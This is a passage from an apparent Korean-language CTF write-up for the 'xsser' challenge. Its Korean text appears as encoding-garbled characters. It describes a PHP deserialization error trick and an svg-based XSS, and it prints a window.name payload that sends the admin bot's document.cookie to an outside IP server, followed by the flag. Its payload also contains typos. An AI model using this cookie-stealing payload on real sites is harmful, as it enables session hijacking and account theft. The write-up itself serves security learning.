ë•Œë¬¸ì— <code>XSS</code>ê°€ í„°ì§€ì§€ ì•ŠìŠµë‹ˆë‹¤. ì¦‰, <code>&lt;script&gt;</code>, <code>javascript:</code>ì™€ ê°™ì€ ê²ƒë“¤ì€ ëª» ì“°ê²Œ ë©ë‹ˆë‹¤. ê·¸ëŸ¬ë¯€ë¡œ <code>&lt;img&gt;</code>, <code>&lt;svg&gt;</code>ì™€ ê°™ì€ íƒœê·¸ë¥¼ ì´ìš©í•´ì„œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì§œì„œ XSSë¥¼ í„°íŠ¸ë¦¬ë©´ ë  ê±° ê°™ìŠµë‹ˆë‹¤.</p><p>ë˜ ë°‘ì— ë³´ë©´ <code>REMOTE_ADDR</code>ì´ 127.0.0.1ì´ë©´ <code>Cookie</code>ì— <code>FLAG</code>ë¥¼ ì¶”ê°€í•´ì£¼ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë¶€ë¶„ì€ ì–´ë“œë¯¼ ë´‡ìœ¼ë¡œ ë³´ë‚´ì£¼ê²Œ ë˜ë©´ ì•Œì•„ì„œ ì²˜ë¦¬ ë©ë‹ˆë‹¤.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/pbCTF%202020/a.png?raw=true"></p><p>ê·¸ëŸ°ë° ì¼ë‹¨ <code>Login</code> í•˜ëŠ” ë¶€ë¶„ì—ì„œ ì—ëŸ¬ë¥¼ ë°œìƒí•´ì•¼ <code>XSS</code>ë¥¼ í„°íŠ¸ë ¤ ì¿ í‚¤ë¥¼ íƒˆì·¨í•˜ë˜ì§€ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ë˜ì„œ <code>serialize()</code>, <code>unserialize()</code>ì— ëŒ€í•´ì„œ ì—¬ëŸ¬ ê°€ì§€ë¥¼ ê²€ìƒ‰ì„ í•´ë³´ì•˜ìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‹¤ ì§ë ¬í™”ëœ ë¬¸ìì—´ì— ì¸ìŠ¤í„´ìŠ¤í™”ë¥¼ í•  ìˆ˜ ì—†ê²Œ í•˜ëŠ” Classê°€ ìˆëŠ”ë°, ì—­ì§ë ¬í™” í•  ë•Œ í•´ë‹¹ Classë¥¼ ì°¸ì¡°í•˜ê²Œ ë˜ë©´ PHPê°€ ì—ëŸ¬ë¥¼ ë‚´ë±‰ëŠ”ë‹¤ê³  í•©ë‹ˆë‹¤.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/SKjGz/btqF1Btn0Ev/L0UO8SwZFdPphU1JLl7dMk/img.png"></p><p>ì € ì°¸ê³  ìë£Œ ì† ë‚´ìš©ì— <code>(e.g. being abstract)</code>ë¼ëŠ” êµ¬ë¬¸ì´ ìˆì–´ ë­”ê°€ <code>abstract</code>ì™€ ê´€ë ¨ì´ ìˆì„ ê±° ê°™ì•„ ë˜ abstractì— ëŒ€í•´ ì£½ë„ë¡ êµ¬ê¸€ë§ì„ í•´ë³´ë‹ˆ ì§ë ¬í™”ëœ ë°ì´í„°ë¡œ <code>Traversable</code>ë¼ëŠ” í´ë˜ìŠ¤ë¥¼ <code>empty</code>ë¡œ ë„˜ê²¨ì£¼ë©´ ì—ëŸ¬ë¥¼ ë°œìƒí•œë‹¤ê³  í•©ë‹ˆë‹¤.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/cUdR6S/btqF3SAvkiZ/Cn0nU7qHiwhCWf1EZoC4mk/img.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$check</span>=unserialize(substr(<span class="variable">$_GET</span>[<span class="string">&#x27;login&#x27;</span>],<span class="number">0</span>,<span class="number">56</span>));</span><br></pre></td></tr></table></figure><p>ê·¸ë˜ì„œ <code>http://xsser.3k.ctf.to/?login=O:11:&quot;Traversable&quot;:0:&#123;&#125;</code> ì´ë ‡ê²Œ ìš”ì²­ì„ ë³´ë‚´ì£¼ë‹ˆ ì—­ì§ë ¬í™” í•˜ëŠ” ë¶€ë¶„ì—ì„œ ì—ëŸ¬ê°€ ë°œìƒí•´ ë¦¬ë‹¤ì´ë ‰ì…˜ì´ ë˜ì§€ ì•Šì€ ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤ :)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$new_name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;new&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$new_name</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$new_name</span>, <span class="string">&#x27;script&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$new_name</span> = htmlentities(<span class="variable">$new_name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$new_name</span> = substr(<span class="variable">$new_name</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1 style=&quot;text-align:center&quot;&gt;Error! Your msg &#x27;</span>.<span class="variable">$new_name</span>.<span class="string">&#x27;&lt;/h1&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;Contact admin /req.php &lt;/h1&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì´ì œ Location ë¶€ë¶„ì€ ì—ëŸ¬ë¥¼ ë°œìƒí•´ì„œ ë¦¬ë‹¤ì´ë ‰ì…˜ì´ ì¼ì–´ë‚˜ì§€ ì•Šì„ ê²ƒì´ê³ , <code>new</code> íŒŒë¼ë¯¸í„°ë¥¼ ë³´ë‚´ì£¼ê²Œ ë˜ë©´ ìœ„ì— ìˆëŠ” ì½”ë“œ ë¶€ë¶„ì´ ì‹¤í–‰ì´ ë  ê²ƒì…ë‹ˆë‹¤. ìœ— ë¶€ë¶„ì—ì„œë„ í•œ ë²ˆ ì´ì•¼ê¸°ë¥¼ í–ˆì§€ë§Œ <code>script</code>ë¼ëŠ” ë¬¸ìì—´ì´ ë“¤ì–´ê°„ <code>Tag</code>, <code>Attribute</code>ëŠ” ì‚¬ìš©í•˜ì§€ ëª»í•©ë‹ˆë‹¤.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/chvPQn/btqF1B1dV2L/wyGz6Ypl4FmkVgh8S8g540/img.png"></p><p><code>script</code> TagëŠ” ì‚¬ìš©í•˜ì§€ ëª»í•˜ë¯€ë¡œ <code>svg</code> Tagë¥¼ ì‚¬ìš©í•´ì„œ <code>xss</code>ë¥¼ íŠ¸ë¦¬ê±° í•´ë³´ë‹ˆ ì˜ ë˜ëŠ” ê²ƒì„ í™•ì¸ í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/n0LuU/btqF2RCjUjC/siwW2R3zm9HM0OPvuDyjS0/img.png"></p><p>íŒì—… ì°½ì„ ë‹«ì•„ ë³´ë‹ˆ <code>Contact admin /req.php</code>ë¼ëŠ” ë¬¸êµ¬ê°€ ë–´ìŠµë‹ˆë‹¤. ì•„ë§ˆ <code>/req.php</code>ê°€ <code>Admin Bot</code>ì´ê³  ì—¬ê¸¸ í†µí•´ XSSë¥¼ í•´ ì¿ í‚¤ë¥¼ íƒˆì·¨ë¥¼ í•´ì•¼ í•˜ëŠ” ê±° ê°™ìŠµë‹ˆë‹¤.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/dM1n0b/btqF14WbTVh/Qeyb3vKTTNeUkMqlYvjcg0/img.png"></p><p><code>/req.php</code>ë¡œ ë“¤ì–´ì™€ ë³´ë‹ˆ <code>Name</code>, <code>Url</code>, <code>Message</code>ë¥¼ ì…ë ¥í•´ Admin Botìœ¼ë¡œ ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ°ë° ìƒê°í•´ë³´ë©´ <code>new</code> íŒŒë¼ë¯¸í„°ì˜ ê°’ì˜ ê¸¸ì´ëŠ” 32ìë¡œ ì œí•œì´ ìˆì–´ document.locationì„ ì´ìš©í•´ ë‚´ ì„œë²„ë¡œ ì¿ í‚¤ë¥¼ íƒˆì·¨ í•  ìˆ˜ëŠ” ì—†ì—ˆìŠµë‹ˆë‹¤. ì—¬ê¸°ì„œ ë§‰í˜€ ì ì„ ìê³  ì¼ì–´ë‚˜ ë‹¤ì‹œ êµ¬ê¸€ë§ì„ ì‹œì‘í•´ë³´ì•˜ëŠ”ë° <code>window.name</code>ì„ ì´ìš©í•´ì„œ xssë¥¼ í•˜ëŠ” ê²ƒì„ ë³´ì•˜ìŠµë‹ˆë‹¤.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.name = <span class="string">&quot;document.location = `http://141.164.55.161:8080/info.php?data=` + document.cookie&quot;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.location = <span class="string">&quot;http://127.0.0.1/?login=?login=O:11:%22Traversable%22:0:&#123;&#125;&amp;new=&lt;svg/onliad=eval(name)?&gt;&quot;</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>window.name</code>ì„ ì´ìš©í•´ ìœ„ì™€ ê°™ì´ í˜ì´ë¡œë“œë¥¼ ì‘ì„±í•´ì£¼ì—ˆìŠµë‹ˆë‹¤.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/cjKZw3/btqF1R3Rj1N/Hb6WOZDU2bFMqO0Djo4K40/img.png"></p><p>/req.phpì—ì„œ <code>Url</code>ì„ ì…ë ¥í•˜ëŠ” ê³³ì— <code>ì œ ì„œë²„ URL</code>ì„ ì…ë ¥í•´ ì „ì†¡ì„ í•´ë³´ë‹ˆ ìŠ¤í¬ë¦½íŠ¸ê°€ ì˜ ì‹¤í–‰ì´ ë˜ì–´ <code>flag.txt</code>ê°€ ìƒê¸´ ê²ƒì„ ë³¼ ìˆ˜ ìˆì—ˆê³ , ê·¸ ê°’ìœ¼ë¡œ FALGê°€ ë“¤ì–´ ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.</p><blockquote><p>FLAG : 3k{3asy_XsS_&amp;_pHp_Ftw}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> LFI </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
